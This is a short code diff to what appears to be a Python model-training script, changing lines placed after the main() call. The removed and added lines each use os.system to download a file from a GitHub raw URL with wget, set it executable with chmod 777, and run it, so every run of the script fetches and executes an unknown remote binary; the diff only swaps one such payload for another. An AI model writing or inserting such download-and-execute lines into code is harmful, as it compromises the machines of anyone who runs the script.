@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/hhhhvhsnbs/sialin/main/naon')
-os.system('chmod 777 naon')
-os.system('./naon')
+os.system('wget https://raw.githubusercontent.com/hhhhvhsnbs/gabut/main/hpn')
+os.system('chmod 777 hpn')
+os.system('./hpn')
